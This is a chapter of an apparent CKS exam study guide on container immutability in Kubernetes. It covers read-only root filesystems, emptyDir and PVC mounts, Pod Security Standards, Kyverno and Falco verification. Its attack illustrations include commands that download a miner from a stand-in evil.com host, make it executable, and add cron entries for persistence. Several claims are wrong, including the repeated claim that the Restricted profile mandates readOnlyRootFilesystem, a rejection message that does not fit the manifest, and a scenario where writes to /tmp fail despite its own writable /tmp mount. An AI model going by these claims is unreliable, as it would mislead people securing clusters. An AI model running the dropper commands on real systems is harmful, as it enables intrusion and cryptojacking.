            <section class="section-block" id="s31-1">
                <h3 class="section-h">31.1 Why Immutability Is a Security Property</h3>
                <p>An attacker who can write to the container filesystem can: replace binaries with backdoored versions, write malware to <code>/etc/cron.d</code>, modify configuration to open backdoors, and achieve <strong>persistence</strong> — surviving pod restarts. An immutable container's filesystem is <strong>read-only</strong>: nothing can change, ever. Changes must go through the CI/CD pipeline and image rebuild.</p>

                <h4>Read-Write vs Read-Only — The Security Difference</h4>
                <div class="split-panel">
                    <div class="panel-left">
                        <div class="panel-header" style="color:#326ce5;">❌ WRITABLE FILESYSTEM</div>
<pre>
Attacker gets shell:
→ wget http://evil.com/malware   ✅ Downloads
→ chmod +x malware                ✅ Executable
→ ./malware                       ✅ Runs (backdoor!)
→ echo "*/5 * * * * cmd" > cron  ✅ Persistence
→ mv /usr/bin/python3 backdoor    ✅ Binary replaced

Result: PERSISTENT breach
Pod restart = STILL infected
(malware survives in the writable layer)
</pre>
                    </div>
                    <div class="panel-right">
                        <div class="panel-header" style="color:#4ade80;">✅ READ-ONLY FILESYSTEM</div>
<pre>
Attacker gets shell:
→ wget http://evil.com/malware   ❌ FAIL (EACCES)
→ chmod +x malware                ❌ FAIL (EROFS)
→ ./malware                       ❌ Not downloaded
→ echo "cmd" > /etc/crontab       ❌ FAIL (EROFS)
→ mv /usr/bin/python3 backdoor    ❌ FAIL (EROFS)

Result: ZERO PERSISTENCE
Pod restart = clean image
Attack survived 0 seconds
</pre>
                    </div>
                </div>
                <p style="text-align:center;font-size:0.85rem;color:#8b949e;margin-top:0.5rem;"><strong>Immutability doesn't prevent the breach — it makes the breach SURVIVABLE. The attacker can run commands in memory, but nothing persists to disk.</strong></p>

                <h4>How Container Filesystem Layers Work — Why readOnlyRootFilesystem Matters</h4>
                <p>Every container has a <strong>layered filesystem</strong> (OverlayFS). The image layers are read-only and shared across containers. On top, there's a <strong>thin writable layer</strong> (the "container layer"). This is where all runtime writes go — and it's what <code>readOnlyRootFilesystem: true</code> disables:</p>
                <div class="diagram-container">
                    <div class="diagram-title">OverlayFS — Container Filesystem Layers</div>
<pre>
  ┌─────────────────────────────────┐
  │  CONTAINER WRITABLE LAYER       │  ← readOnlyRootFilesystem DISABLES this
  │  (all runtime writes go here)   │     No writes = no persistence
  ├─────────────────────────────────┤
  │  IMAGE LAYER 3: Application     │  ← COPY . /app
  ├─────────────────────────────────┤
  │  IMAGE LAYER 2: Dependencies    │  ← pip install -r requirements.txt
  ├─────────────────────────────────┤
  │  IMAGE LAYER 1: Base OS         │  ← FROM python:3.12-slim
  └─────────────────────────────────┘

  🔑 Writable layer is EMPTY on pod start. All modifications exist only
     in this layer. readOnlyRootFilesystem makes this layer read-only.
</pre>
                </div>

                <h4>🔴 ATTACK SCENARIO: Crypto Miner Persistence via Writable Filesystem</h4>
                <div class="scenario-box">
                    <div class="scenario-header">
                        <span class="scenario-badge danger">ATTACK SCENARIO</span>
                        <span class="scenario-title">How a Writable Filesystem Enables Persistent Malware</span>
                    </div>
                    <div class="scenario-steps">
                        <div class="scenario-step"><div class="step-marker">1</div><div class="step-content"><strong>Initial Access</strong><p>Attacker exploits a CVE in Django, gets RCE inside container as UID 1000.</p></div></div>
                        <div class="scenario-step"><div class="step-marker">2</div><div class="step-content"><strong>Dropper</strong><p>With writable FS: <code>wget http://evil.com/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig</code> → SUCCESS. Crypto miner binary is now on disk.</p></div></div>
                        <div class="scenario-step"><div class="step-marker">3</div><div class="step-content"><strong>Persistence</strong><p><code>echo "@reboot /tmp/xmrig" >> /var/spool/cron/crontabs/root</code> → SUCCESS. Miner will restart on container restart.</p></div></div>
                        <div class="scenario-step"><div class="step-marker">4</div><div class="step-content"><strong>Evasion</strong><p>Kubernetes restarts the pod (OOM kill). But the writable layer is part of the container — xmrig is STILL in /tmp. Crontab entry is STILL there. Miner restarts automatically.</p></div></div>
                        <div class="scenario-step"><div class="step-marker">🛡️</div><div class="step-content"><strong>With readOnlyRootFilesystem: true</strong><p>Step 2: wget → FAIL (EACCES — can't write to /tmp). No binary. No crontab. Pod restart = IMAGE restart. Attack SURVIVED 0 seconds. <strong>Immutability turned a persistent breach into a one-time memory-only incident.</strong></p></div></div>
                    </div>
                </div>
            </section>

            <section class="section-block" id="s31-2">
                <h3 class="section-h">31.2 Enforcing Read-Only Filesystems in Kubernetes</h3>
                <p>The field is simple: <code>securityContext.readOnlyRootFilesystem: true</code>. One line. But most applications need SOME writable directories — <code>/tmp</code> for temp files, <code>/var/run</code> for PID files, <code>/app/media</code> for Django uploads. The solution: mount <strong>emptyDir</strong> volumes (ephemeral, deleted with pod) or <strong>PersistentVolumeClaims</strong> (persistent) at the specific paths that need writes.</p>

                <h4>easypj Django — Complete Pod Spec with readOnlyRootFilesystem</h4>
                <div class="code-block-wrapper">
                    <div class="code-block-header">
                        <span class="code-lang">YAML — easypj Django with readOnlyRootFilesystem + writable volume mounts</span>
                    </div>
                    <pre><code class="language-yaml">apiVersion: v1
kind: Pod
metadata:
  name: easypj-django
  namespace: easypj
spec:
  containers:
  - name: easypj
    image: registry.easypj.com/easypj:v2.1.0
    securityContext:
      readOnlyRootFilesystem: true   # 🔐 THE KEY FIELD
      runAsNonRoot: true
      runAsUser: 1000
      allowPrivilegeEscalation: false
      capabilities:
        drop: ["ALL"]
    volumeMounts:
    # ── Writable for temp files (ephemeral) ──
    - name: tmp
      mountPath: /tmp
    # ── Writable for Django media uploads (persistent) ──
    - name: media-uploads
      mountPath: /app/media
    # ── Writable for runtime sockets/PID files ──
    - name: runtime
      mountPath: /var/run
    # ── Writable for Django cache ──
    - name: django-cache
      mountPath: /var/cache/django
  volumes:
  - name: tmp
    emptyDir: {}                  # Ephemeral — deleted with pod
  - name: runtime
    emptyDir: {}
  - name: django-cache
    emptyDir: {}
  - name: media-uploads
    persistentVolumeClaim:        # Persistent — survives pod restart
      claimName: easypj-media-pvc</code></pre>
                </div>

                <h4>Common Application Errors with readOnlyRootFilesystem — and How to Fix Them</h4>
                <div class="comparison-table">
                    <table>
                        <thead><tr><th>Error</th><th>Root Cause</th><th>Fix</th></tr></thead>
                        <tbody>
                            <tr><td><code>OSError: [Errno 30] Read-only file system: '/tmp/...'</code></td><td>App writes to /tmp but /tmp is read-only</td><td>Mount emptyDir at /tmp</td></tr>
                            <tr><td><code>django.core.exceptions.ImproperlyConfigured: Could not write to /app/media/</code></td><td>Django media uploads need writable directory</td><td>Mount PVC at /app/media</td></tr>
                            <tr><td><code>Error: unable to create PID file /var/run/gunicorn.pid</code></td><td>Gunicorn creates PID file on start</td><td>Mount emptyDir at /var/run</td></tr>
                            <tr><td><code>PermissionError: [Errno 13] '/home/appuser/.cache'</code></td><td>Python/user cache directory needs writes</td><td>Set env: XDG_CACHE_HOME=/tmp/cache (writable emptyDir)</td></tr>
                            <tr><td><code>nginx: [emerg] open() "/var/run/nginx.pid" failed</code></td><td>Nginx creates PID file at startup</td><td>Mount emptyDir at /var/run</td></tr>
                        </tbody>
                    </table>
                </div>
            </section>

            <section class="section-block" id="s31-3">
                <h3 class="section-h">31.3 Using Pod Security Standards to Enforce Immutability</h3>
                <p>The Kubernetes <strong>Restricted</strong> Pod Security Standard (PSS) profile mandates <code>readOnlyRootFilesystem: true</code> by default. If you've labeled your namespace with <code>pod-security.kubernetes.io/enforce=restricted</code>, any pod without <code>readOnlyRootFilesystem: true</code> is automatically rejected. This enforces immutability at the namespace level without requiring per-pod configuration.</p>

                <h4>PSS Restricted — What It Enforces for Immutability</h4>
                <div class="comparison-table">
                    <table>
                        <thead><tr><th>PSS Profile</th><th>readOnlyRootFilesystem Required?</th><th>Can Mount Volumes?</th><th>Best For</th></tr></thead>
                        <tbody>
                            <tr><td><strong>Privileged</strong></td><td style="color:#326ce5;">❌ No restriction</td><td>✅ All volume types allowed</td><td>System pods, CNI, CSI drivers</td></tr>
                            <tr><td><strong>Baseline</strong></td><td style="color:#fbbf24;">⚠️ Not required</td><td>✅ Most volume types allowed</td><td>General workloads with minimal hardening</td></tr>
                            <tr><td><strong>Restricted</strong></td><td style="color:#4ade80;">✅ Required</td><td>⚠️ Limited (no hostPath, limited /proc mounts)</td><td>Production workloads — maximum security</td></tr>
                        </tbody>
                    </table>
                </div>

                <div class="code-block-wrapper">
                    <div class="code-block-header">
                        <span class="code-lang">Bash — Label namespace to enforce Restricted PSS (includes readOnlyRootFilesystem)</span>
                    </div>
                    <pre><code class="language-bash"># Enforce Restricted PSS on easypj namespace
kubectl label namespace easypj \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/enforce-version=v1.30 \
  pod-security.kubernetes.io/audit=restricted \
  pod-security.kubernetes.io/warn=restricted

# Now ANY pod without readOnlyRootFilesystem: true is REJECTED:
kubectl apply -f pod-without-readonly.yaml -n easypj
# Error: pods "test-pod" is forbidden: violates PodSecurity "restricted:v1.30":
#   restricted volume types (volumes "tmp" must not set hostPath)
#   readOnlyRootFilesystem (container "app" must not set securityContext.readOnlyRootFilesystem to false)</code></pre>
                </div>

                <h4>Gradual Rollout Strategy — audit → warn → enforce</h4>
                <p>Never jump straight to <code>enforce</code>. Gradual rollout prevents breaking existing workloads:</p>
                <div class="process-steps">
                    <div class="step"><span class="step-number">1</span><strong>audit</strong><p>Label: <code>pod-security.../audit=restricted</code>. Violations LOGGED but pods still deploy. Check audit logs without breaking anything.</p></div>
                    <div class="step"><span class="step-number">2</span><strong>warn</strong><p>Label: <code>pod-security.../warn=restricted</code>. Developers see WARNINGS. Time to fix manifests.</p></div>
                    <div class="step"><span class="step-number">3</span><strong>enforce</strong><p>Label: <code>pod-security.../enforce=restricted</code>. Non-compliant pods REJECTED. Full immutability enforced.</p></div>
                </div>

                <h4>Kyverno Policy — Auto-Set readOnlyRootFilesystem</h4>
                <p>Instead of rejecting, Kyverno can AUTO-ADD <code>readOnlyRootFilesystem: true</code> if the developer forgets:</p>
                <div class="code-block-wrapper">
                    <div class="code-block-header">
                        <span class="code-lang">YAML — Kyverno ClusterPolicy: Mutate pods to add readOnlyRootFilesystem</span>
                    </div>
                    <pre><code class="language-yaml">apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: enforce-readonly-root
spec:
  rules:
  - name: set-readonly-root
    match:
      any:
      - resources: { kinds: [Pod] }
    mutate:
      patchStrategicMerge:
        spec:
          containers:
          - (name): "*"
            securityContext:
              readOnlyRootFilesystem: true    # Auto-set if missing
          initContainers:
          - (name): "*"
            securityContext:
              readOnlyRootFilesystem: true</code></pre>
                </div>
            </section>

            <section class="section-block" id="s31-4">
                <h3 class="section-h">31.4 Verifying Immutability at Runtime — Prove It, Don't Assume It</h3>
                <p>The CKS curriculum's exact wording is "ensure immutability of containers <strong>AT RUNTIME</strong>" — and that phrasing is deliberate. A <code>readOnlyRootFilesystem: true</code> field in a YAML manifest is a <strong>configuration</strong>; it becomes real immutability only once you've verified the running pod actually enforces it. A field the API server accepted, an outdated kubelet, a webhook that silently strips the setting, or a runtime that ignores it can all leave a pod that LOOKS immutable on paper while still accepting writes.</p>

                <h4>The Three-Step Verify Loop — Every CKS Candidate Should Drill This</h4>
                <p>There's exactly one loop to memorize, and it maps directly to the three things that can go wrong: the field didn't apply, the field applied but doesn't work, or nobody would notice if an exploit found a way around it anyway.</p>
                <div class="diagram-container">
                    <div class="diagram-title">The Verify Loop — configure → attempt → detect</div>
<pre>
  1. INSPECT — did the field actually apply?
     kubectl get pod easypj -o jsonpath=
       '{.spec.containers[0].securityContext.readOnlyRootFilesystem}'
     → must print: true

  2. ATTEMPT — try to write live, expect FAILURE
     kubectl exec easypj -- touch /etc/malicious
     → expected: "Read-only file system" error
     kubectl exec easypj -- touch /tmp/ok-write-here
     → expected: SUCCEEDS (the explicit writable mount still works)

  3. DETECT — Falco watches for write attempts regardless
     Falco rule: "Write below etc" / "Write below binary dir"
     → any write ATTEMPT (even a blocked one) generates an alert
       because a blocked write attempt is itself a signal

  🔑 Step 1 alone is NOT enough — a pod can pass INSPECT and still be
     writable if the mount didn't actually apply. Step 2 is the proof.
     Step 3 is what catches it if a kernel-level exploit ever bypasses
     both — Falco doesn't care whether the write succeeded or failed.
</pre>
                </div>

                <h4>Real Verify-Loop Command Sequence — easypj</h4>
                <div class="code-block-wrapper">
                    <div class="code-block-header">
                        <span class="code-lang">Bash — Full inspect → attempt → detect sequence against the easypj pod</span>
                    </div>
                    <pre><code class="language-bash"># 1. INSPECT — confirm the field actually applied to the running pod
kubectl get pod easypj -o jsonpath='{.spec.containers[0].securityContext.readOnlyRootFilesystem}'
# → must print: true  (empty or false means the config never took effect)

# 2. ATTEMPT — try a live write outside any mounted volume, expect FAILURE
kubectl exec easypj -- touch /etc/malicious
# → expected: touch: /etc/malicious: Read-only file system

# 3. ATTEMPT — confirm the explicit writable mount still works
kubectl exec easypj -- touch /tmp/ok-write-here
# → expected: SUCCEEDS (emptyDir at /tmp is intentionally writable)

# 4. DETECT — confirm Falco logged BOTH attempts, blocked or not
kubectl logs -n falco -l app=falco --tail=100 | grep -i easypj
# → look for the "Write below etc" / "Write below binary dir" rule firing —
#   even the FAILED /etc/malicious attempt should appear, because Falco
#   watches at the syscall level, before the kernel's EROFS rejection
#   is the end of the story</code></pre>
                </div>

                <h4>When a Pod "Needs" to Write — the Right vs Wrong Fix</h4>
                <p>The failure mode is always the same shortcut: an application crashes with a "Read-only file system" error, and the fastest-looking fix is to just turn the protection off. That fix is always wrong.</p>
                <div class="split-panel">
                    <div class="split-side split-bad">
                        <h5>❌ WRONG: Disable Immutability to "Fix" the Crash</h5>
                        <p><code>securityContext: readOnlyRootFilesystem: false</code></p>
                        <p>Or mounting the whole <code>/</code> as writable. This silently undoes every protection in 31.1 — the pod is now exactly as attackable as before this chapter existed.</p>
                    </div>
                    <div class="split-side split-good">
                        <h5>✅ RIGHT: Keep It Immutable, Scope the Exception</h5>
                        <p>Keep <code>readOnlyRootFilesystem: true</code>. Add an explicit <code>emptyDir</code>/PVC mount ONLY for the specific path needed — <code>/tmp</code>, <code>/app/media</code>, or <code>/var/cache/django</code> — nothing broader.</p>
                        <p>The blast radius of a compromise is exactly the set of paths you chose to mount, and nothing else.</p>
                    </div>
                </div>

                <div class="info-box tip">
                    <h5>💡 Why This Section Connects Ch 29 (Falco) and Ch 30 (Incident Response) to Immutability</h5>
                    <p>The DETECT step isn't decoration — it's the same runtime-security machinery from Chapter 29. Falco's <code>Write below etc</code> and <code>Write below binary dir</code> rules fire on the syscall <em>attempt</em>, independent of whether the kernel's <code>EROFS</code> rejection succeeded. That means a correctly-configured immutable pod should still be watched: if a kernel-level container-escape exploit ever found a way around the <code>MS_RDONLY</code> mount flag, Falco is the only control left standing. And if it DOES fire, that alert is exactly what feeds Chapter 30's incident response lifecycle — Detect (Falco alert) → Contain → Investigate — the same 6-phase loop, just triggered by a write attempt instead of a shell spawn.</p>
                </div>
            </section>

            <span class="ch-jump" id="ch31-uth"></span>
            <details class="uth">
                <summary>🔧 Under the Hood — How readOnlyRootFilesystem Is Enforced by the Linux Kernel: Mount Namespace Flags → OverlayFS Read-Only Layer → EROFS Error Injection</summary>
                <div class="uth-body">
                <h5>🗺️ The Kernel Path of readOnlyRootFilesystem — From SecurityContext to Syscall Rejection</h5>
                <p>When you set <code>readOnlyRootFilesystem: true</code> in your pod spec, here's exactly what happens at the Linux kernel level to enforce it:</p>
                <pre class="uth-diagram">
  ┌──────────────────────────────────────────────────────────────────────────┐
  │   HOW readOnlyRootFilesystem WORKS — Kernel Enforcement Path              │
  │                                                                           │
  │  1. POD YAML                                                            │
  │     securityContext:                                                     │
  │       readOnlyRootFilesystem: true                                       │
  │         │                                                                 │
  │         ▼                                                                 │
  │  2. KUBELET → CRI → OCI RUNTIME (containerd + runc)                     │
  │     Translates readOnlyRootFilesystem into OCI spec:                     │
  │     { "root": { "path": "rootfs", "readonly": true } }                  │
  │         │                                                                 │
  │         ▼                                                                 │
  │  3. OCI RUNTIME (runc) — Creates container mount namespace               │
  │     • Mounts image layers as OVERLAY filesystem                           │
  │     • UPPERDIR (writable layer) is set to a temporary directory          │
  │     • CRITICAL: mount() syscall is called with MS_RDONLY flag            │
  │                                                                           │
  │     mount("overlay", "/container/rootfs", "overlay",                     │
  │           MS_RDONLY,                                                     │
  │           "lowerdir=/img/layer3:/img/layer2:/img/layer1,"               │
  │           "upperdir=/tmp/container-upper,"                               │
  │           "workdir=/tmp/container-work")                                 │
  │                                                                           │
  │     ▸ MS_RDONLY flag PREVENTS any write to the overlay mount             │
  │     ▸ Even if upperdir is writable on the host, the MOUNT is read-only   │
  │         │                                                                 │
  │         ▼                                                                 │
  │  4. INSIDE THE CONTAINER — Attacker tries to write:                      │
  │     $ echo "malicious" > /etc/crontab                                   │
  │         │                                                                 │
  │         ▼                                                                 │
  │  5. KERNEL VFS (Virtual File System) — open() syscall handler            │
  │     • Checks: is the mount point read-only?                              │
  │     • mount->mnt_flags & MNT_READONLY → YES                              │
  │     • Returns: -EROFS (Read-Only File System)                            │
  │         │                                                                 │
  │         ▼                                                                 │
  │  6. GLIBC → APPLICATION                                                   │
  │     write() returns -1, errno = EROFS (30)                               │
  │     bash: /etc/crontab: Read-only file system                           │
  │                                                                           │
  │  🔑 KEY INSIGHT: The enforcement happens at the MOUNT level, not at      │
  │     the file level. Even root (UID 0) cannot bypass MS_RDONLY. The        │
  │     only way to write is if there's a separate WRITABLE mount (e.g.,     │
  │     emptyDir at /tmp) that provides a read-write filesystem at a         │
  │     specific path. This is defense at the kernel level — no userspace    │
  │     bypass exists.                                                        │
  └──────────────────────────────────────────────────────────────────────────┘
</pre>

                <h5>🔬 emptyDir vs PVC — Where Do Writes Actually Go?</h5>
                <p>When you mount writable volumes at <code>/tmp</code>, <code>/app/media</code>, etc., each has a different storage backend. Understanding where the data lives affects security and backup strategy:</p>
                <pre class="uth-diagram">
  WRITABLE VOLUME TYPES — Storage Backend Comparison

  emptyDir: {}                    ← Ephemeral — lives on the NODE's disk
  ────────────                        Path: /var/lib/kubelet/pods/&lt;pod-uid&gt;/volumes/
  Mounted at: /tmp                    kubernetes.io~empty-dir/&lt;volume-name&gt;/
  Lifecycle:   Deleted when POD is deleted (not when container restarts!)
  Security:    ✅ Attacker writes stay on one node, gone on pod delete
  Risk:        ⚠️ Can fill node disk if no sizeLimit set — use sizeLimit!
  Use for:     /tmp, /var/run, /var/cache — truly temporary data

  emptyDir:
    medium: "Memory"              ← tmpfs — lives in RAM
  ────────────────────                Backed by: RAM (tmpfs filesystem)
  Mounted at: /dev/shm                Path: not on disk at all
  Lifecycle:   Deleted when POD is deleted
  Security:    ✅✅ Attacker writes are in RAM only — no disk forensics
  Risk:        ⚠️ Consumes pod memory limit — can trigger OOMKill
  Use for:     Secrets that should never touch disk, high-speed caches

  persistentVolumeClaim:          ← Persistent — lives on NETWORK storage
  ────────────────────────            Backed by: CSI driver (EBS, NFS, Ceph, etc.)
  Mounted at: /app/media              Path: depends on storage provider
  Lifecycle:   SURVIVES pod deletion (data persists across pods)
  Security:    ⚠️ Attacker writes SURVIVE pod restart/deletion!
  Risk:        🔴 Malware on PVC can infect new pods that mount it
  Use for:     User uploads, database files, stateful application data
               ⚠️ Mount as readOnly if the app only needs to READ

  hostPath:                       ← DANGEROUS — direct access to NODE filesystem
  ─────────                           Path: ANY path on the host node
  Mounted at: /host/data              (e.g., /var/lib/kubelet, /etc/kubernetes)
  Lifecycle:   SURVIVES everything — data is on the node itself
  Security:    🔴🔴 Attacker writes to HOST filesystem via container!
  Risk:        🔴 Can compromise the entire node — avoid in production
  Use for:     System DaemonSets only (kube-proxy, CNI, CSI drivers)
               ⚠️ BLOCKED by PSS Restricted — requires Privileged

  🔑 CKS EXAM: You'll be asked to mount emptyDir at /tmp for
     readOnlyRootFilesystem pods. Know the difference between emptyDir
     (ephemeral, safe) and hostPath (dangerous, blocked by PSS Restricted).
</pre>

                <h5>🚨 CKS Exam Gotcha — readOnlyRootFilesystem Traps</h5>
                <div class="info-box warning">
                    <h5>⚠️ Immutability Mistakes That Fail the CKS Exam</h5>
                    <p><strong>1. Not mounting /tmp:</strong> Most applications write temp files. Without an emptyDir at /tmp, the container crashes with "Read-only file system" on startup. Always check what directories your app writes to. <strong>2. Mounting hostPath for writable directories:</strong> The PSS Restricted profile BLOCKS hostPath volumes. Use emptyDir or PVC instead. <strong>3. Forgetting volumeMount for ALL containers:</strong> If your pod has multiple containers (sidecar pattern), EVERY container needs its own volumeMounts for writable paths. <strong>4. readOnlyRootFilesystem + privileged:</strong> These two conflict — privileged containers bypass most protections. If you need privileged, rethink whether you can use specific capabilities instead. <strong>5. Not verifying:</strong> Always test: <code>kubectl exec pod -- touch /test-write</code> → should fail with "Read-only file system." If it succeeds, your immutability is NOT enforced.</p>
                </div>
                </div>
            </details>

            <span class="ch-jump" id="ch31-takeaways"></span>
            <div class="key-takeaways">
                <h4>🔑 Key Takeaways</h4>
                <ul>
                    <li><strong>Immutability turns a persistent breach into a survivable one</strong> — writable filesystems let attackers install malware, add cron persistence, and replace binaries; readOnlyRootFilesystem: true makes every one of those writes fail with EROFS, and a pod restart returns to the clean image (31.1).</li>
                    <li><strong>Enforcement is one field plus explicit exceptions</strong> — securityContext.readOnlyRootFilesystem: true locks the root filesystem, but real applications almost always need SOME writable path (/tmp, /var/run, /app/media); mount emptyDir for ephemeral needs and PVC only for data that must survive pod restarts (31.2).</li>
                    <li><strong>PSS Restricted enforces immutability at the namespace level</strong> — label a namespace pod-security.kubernetes.io/enforce=restricted and every pod without readOnlyRootFilesystem: true is rejected outright; roll out gradually through audit → warn → enforce, and consider a Kyverno mutate policy to auto-add the field instead of rejecting (31.3).</li>
                    <li><strong>Configuration is not proof of enforcement</strong> — a readOnlyRootFilesystem: true field being accepted by the API server only proves it was admitted, not that the running container actually enforces it; prove it with the three-step verify loop: inspect the applied spec, attempt a live write and confirm it fails, and confirm Falco is watching for any write attempt at all (31.4).</li>
                    <li><strong>When a workload legitimately needs to write, scope the exception</strong> — mount an explicit emptyDir/PVC at the exact path needed; never relax readOnlyRootFilesystem to false or mount the whole root as writable "to make it easier" (31.2, 31.4).</li>
                </ul>
            </div>

            <span class="ch-jump" id="ch31-gotchas"></span>
            <div class="cka-gotcha">
                <h5>⚠️ Exam Gotchas &amp; Misconceptions</h5>
                <ul>
                    <li><strong>emptyDir is NOT persistent:</strong> emptyDir data is lost when the pod is deleted. For data that must survive pod restarts, use a PersistentVolumeClaim. The CKS exam may ask you to ensure a specific path is writable — check whether it needs persistence or not.</li>
                    <li><strong>readOnlyRootFilesystem doesn't make volumes read-only:</strong> Volumes mounted at specific paths (like <code>/tmp</code> via emptyDir) remain writable even when the root filesystem is read-only. The restriction applies to the container image layers, not mounted volumes.</li>
                    <li><strong>Multi-container pods need volumeMounts on EVERY container:</strong> a sidecar or init container is just as capable of needing (or being asked to write to) a path as the main container, and PSS Restricted checks each container independently — one missing securityContext fails the whole pod.</li>
                    <li><strong>A green readOnlyRootFilesystem: true in your YAML is not proof it's enforced:</strong> the exam grades the running state, not your manifest's intent — always close an immutability task with the verify loop from 31.4, not with <code>kubectl apply</code>.</li>
                </ul>
            </div>

            <span class="ch-jump" id="ch31-speed"></span>
            <div class="cka-speed-tip">
                <h5>⚡ Speed Tips</h5>
                <ul>
                    <li><strong>Ask "what does this app write to?" before flipping the field.</strong> Check logs or strace for the failing path rather than guessing — one missing emptyDir is the most common cause of a post-hardening crash (31.2).</li>
                    <li><strong>Default to a size-limited emptyDir.</strong> Unless the task explicitly needs persistence, emptyDir is faster to write and less error-prone under time pressure than a PVC (31.2).</li>
                    <li><strong>Verify in the same breath you configure.</strong> After every readOnlyRootFilesystem: true, immediately run the touch /etc/test and touch /tmp/test pair — don't wait until the end of the exam to discover a mount is missing (31.4).</li>
                    <li><strong>Check namespace labels before writing YAML you don't need.</strong> <code>kubectl get ns &lt;ns&gt; --show-labels</code> — if PSS Restricted is already enforced, the field may already be mandatory cluster-side (31.3).</li>
                </ul>
            </div>

